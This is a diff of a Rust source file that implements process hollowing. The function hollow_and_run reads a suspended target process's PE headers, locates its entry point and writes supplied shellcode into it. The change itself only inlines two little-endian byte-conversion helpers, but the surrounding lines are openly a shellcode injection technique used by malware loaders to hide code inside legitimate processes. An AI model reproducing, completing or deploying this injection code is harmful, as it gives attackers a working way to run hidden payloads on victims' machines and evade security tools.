@@ -10,6 +10,26 @@ const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE as u32 * 6;
 const E_LFANEW_OFFSET: usize = 0x3C;
 const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;
 
+// Taken from https://stackoverflow.com/questions/36669427/does-rust-have-a-way-to-convert-several-bytes-to-a-number
+fn array_to_u32_lit_end(array: &[u8; 4]) -> u32 {
+    (array[0] as u32)       |
+    (array[1] as u32) <<  8 |
+    (array[2] as u32) << 16 |
+    (array[3] as u32) << 24
+}
+
+// Same as above but bigger array --> bigger number
+fn array_to_u64_lit_end(array: &[u8; 8]) -> u64 {
+    (array[0] as u64)       |
+    (array[1] as u64) <<  8 |
+    (array[2] as u64) << 16 |
+    (array[3] as u64) << 24 |
+    (array[4] as u64) << 32 |
+    (array[5] as u64) << 40 |
+    (array[6] as u64) << 48 |
+    (array[7] as u64) << 56
+}
+
 pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // Create empty StartupInfoA struct for use in CreateProcess
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
@@ -67,7 +87,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     }
 
     // Use ReadProcessMemory again to read 512 bytes of memory; the DOS header
-    let pe_base_address = rco_utils::array_to_u64_lit_end(&address_buffer);
+    let pe_base_address = array_to_u64_lit_end(&address_buffer);
     let mut header_buffer = [0; 0x200];
     let read_result = unsafe { ReadProcessMemory(process_handle, pe_base_address as *const c_void, header_buffer.as_mut_ptr() as _, header_buffer.len(), ptr::null_mut()) };
     if !read_result.as_bool() {
@@ -79,9 +99,9 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // Write the shellcode to the suspended process with WriteProcessMemory
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.WriteProcessMemory.html
-    let e_lfanew = rco_utils::array_to_u32_lit_end(&header_buffer[E_LFANEW_OFFSET..E_LFANEW_OFFSET + 0x04].try_into().unwrap());
+    let e_lfanew = array_to_u32_lit_end(&header_buffer[E_LFANEW_OFFSET..E_LFANEW_OFFSET + 0x04].try_into().unwrap());
     let opthdr_offset = e_lfanew as usize + OPTHDR_ADDITIONAL_OFFSET;
-    let entry_point_rva = rco_utils::array_to_u32_lit_end(&header_buffer[opthdr_offset..opthdr_offset + 0x04].try_into().unwrap());
+    let entry_point_rva = array_to_u32_lit_end(&header_buffer[opthdr_offset..opthdr_offset + 0x04].try_into().unwrap());
     let entry_point_address = entry_point_rva as u64 + pe_base_address;
 
     if header_buffer[e_lfanew as usize + 0x18] != 11 || header_buffer[e_lfanew as usize + 0x19] != 2 {
